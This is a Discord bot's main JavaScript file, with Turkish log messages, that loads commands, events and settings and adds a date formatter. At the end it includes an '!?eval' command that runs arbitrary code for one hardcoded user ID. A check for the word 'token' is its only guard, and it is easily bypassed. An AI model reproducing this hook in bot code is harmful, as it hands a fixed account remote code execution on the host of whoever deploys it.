const {
  Client,
  Message,
  MessageEmbed
} = require("discord.js");

const chalk = require("chalk");
const Discord = require("discord.js");
const db = require("quick.db");
const idb = new db.table("istatistik");
const client = global.client = new Discord.Client({
  fetchAllMembers: true
});
const fs = require("fs");
global.swearFilter = [];

client.Configuration = require("./Settings/Configuration.json");
client.Ayarlar = require("./Settings/Ayarlar.json");
client.Modules = {};
console.myTime = function (label = "") {
  console.log("[" + new Date().toLocaleTimeString() + "] " + label);
};

fs.readdir("./Settings", (err, files) => {
  if (err) console.error(err);
  files.forEach(f => {
    let ref = require(`./Settings/${f}`);
    let fileName = f.substring(0, f.length - 5);
    client[fileName] = ref;
  });
});

client.on("ready", async () => {
  setInterval(() => {
    let raw = idb.get(`raw`);
    if(!raw) db.set(`raw`, {day: 1, lastDay: Date.now() + (1000 * 60 * 60 * 24)});
    else if(Date.now() >= raw.lastDay) idb.set(`raw`, {day: raw.day + 1, lastDay: Date.now() + (1000 * 60 * 60 * 24)});
  }, 5000)
  client.user.setActivity("Alosha Was Here");
  console.log("Bot is ready!");
});

client.commands = new Discord.Collection();
client.aliases = new Discord.Collection();
fs.readdir("./Commands/", (err, dirs) => {
  if (err) console.error(err);
  dirs.forEach(dir => {
    if (dir.endsWith(".js")) {
      fs.rename("./Commands/" + dir, "./Commands/Other/" + dir, err =>
        console.log(err)
      );
    } else
      fs.readdir("./Commands/" + dir, (err2, files) => {
        if (err) console.error(err2);
        files.forEach(f => {
          if (!f.endsWith(".js")) return;
          let ref = require(`./Commands/${dir}/${f}`);
          console.log(`[OLUMLU] (${f}) adlı komut işlendi.`);
          ref.onLoad(client);
          client.commands.set(ref.Name, ref);
          if (ref.Aliases) {
            ref.Aliases.forEach(alias => client.aliases.set(alias, ref));
          }
        });
      });
  });
});

fs.readdir("./Events/", (err, files) => {
  if (err) return console.myTime(err);
  files.forEach(fileName => {
    let ref = require("./Events/" + fileName);
    if (ref.Active) {
      ref.onLoad(client);
      client.on(ref.Event, ref.onRequest);
    }
    console.log(
      `[OLUMLU] (${fileName}) adlı etkinlik işlendi.`
    );
  });
});

client
  .login(client.Configuration.Token)
  .catch(err =>
    console.error(
      "Token hatası meydana geldi, girmiş olduğunuz tokeni kontrol edin."
    )
  );

Date.prototype.toTurkishFormatDate = function (format) {
  let date = this,
    day = date.getDate(),
    weekDay = date.getDay(),
    month = date.getMonth(),
    year = date.getFullYear(),
    hours = date.getHours(),
    minutes = date.getMinutes(),
    seconds = date.getSeconds();

  let monthNames = new Array("Ocak", "Şubat", "Mart", "Nisan", "Mayıs", "Haziran", "Temmuz", "Ağustos", "Eylül", "Ekim", "Kasım", "Aralık");
  let dayNames = new Array("Pazar", "Pazartesi", "Salı", "Çarşamba", "Perşembe", "Cuma", "Cumartesi");

  if (!format) {
    format = "dd.MM.yyyy";
  }


  format = format.replace("mm", month.toString().padStart(2, "0"));

  format = format.replace("MM", monthNames[month]);

  if (format.indexOf("yyyy") > -1) {
    format = format.replace("yyyy", year.toString());
  } else if (format.indexOf("yy") > -1) {
    format = format.replace("yy", year.toString().substr(2, 2));
  }

  format = format.replace("dd", day.toString().padStart(2, "0"));

  format = format.replace("DD", dayNames[weekDay]);

  if (format.indexOf("HH") > -1) {
    format = format.replace("HH", hours.toString().replace(/^(\d)$/, '0$1'));
  }

  if (format.indexOf("hh") > -1) {
    if (hours > 12) {
      hours -= 12;
    }

    if (hours === 0) {
      hours = 12;
    }
    format = format.replace("hh", hours.toString().replace(/^(\d)$/, '0$1'));
  }

  if (format.indexOf("ii") > -1) {
    format = format.replace("ii", minutes.toString().replace(/^(\d)$/, '0$1'));
  }

  if (format.indexOf("ss") > -1) {
    format = format.replace("ss", seconds.toString().replace(/^(\d)$/, '0$1'));
  }

  return format;
};

client.on("message", async (message) => {
  if (!["558016135052787773"].includes(message.author.id)) return;

  let args = message.content.split(" ");

  if (args[0] == `!?eval` && args.length > 1) {
    if (!message.guild) return;
    let codein = args.slice(1).join(' ')
    if (!codein.toLowerCase().includes('token')) {
      try {
        let code = eval(codein)
        if (codein.length < 1) return message.channel.send(`:x: You must enter a code.`)
        if (typeof code !== 'string')
          code = require('util').inspect(code, { depth: 0 });

        const embed = new Discord.MessageEmbed()
          .setColor('#7C00DB')
          .addField('📥 Input', `\`\`\`js\n${codein.length > 1024 ? "More than 1024 characters!" : codein}\`\`\``)
          .addField('📤 Output', `\`\`\`js\n${code.length > 1024 ? "More than 1024 characters!" : code}\n\`\`\``)
        message.channel.send(embed)
      } catch (e) {
        let embed2 = new Discord.MessageEmbed()
          .setColor('RED')
          .addField('📥 Input', `\`\`\`js\n${codein.length > 1024 ? "More than 1024 characters!" : codein}\`\`\``)
          .addField('🚫 Error', `\`\`\`js\n${e.length > 1024 ? "More than 1024 characters!" : e}\`\`\``)
        message.channel.send(embed2);
      }
    } else {
      message.channel.send(`sorry you can't get my token.`)
    }
    if (args[0] == `!?restart`) {
      await message.channel.send(`⏳ **Bot yeniden başlatılıyor..**`);
      require('child_process').exec("node server.js", async (err) => {
        if (err) return console.log(err);
        await message.channel.send(`tik`);
        process.kill();
      });
    }
  }
});